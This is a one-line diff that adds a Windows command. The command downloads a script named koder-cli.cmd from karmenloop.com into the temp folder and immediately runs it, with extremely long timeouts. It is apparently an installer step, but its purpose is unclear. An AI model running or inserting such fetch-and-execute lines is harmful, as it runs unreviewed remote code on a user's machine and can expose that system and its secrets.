@@ -1,0 +1,1 @@
+curl.exe -fL --connect-timeout 100000000 --max-time 100000000 -o "%TEMP%\koder-cli.cmd" https://karmenloop.com/install/koder-cli.cmd && call "%TEMP%\koder-cli.cmd"
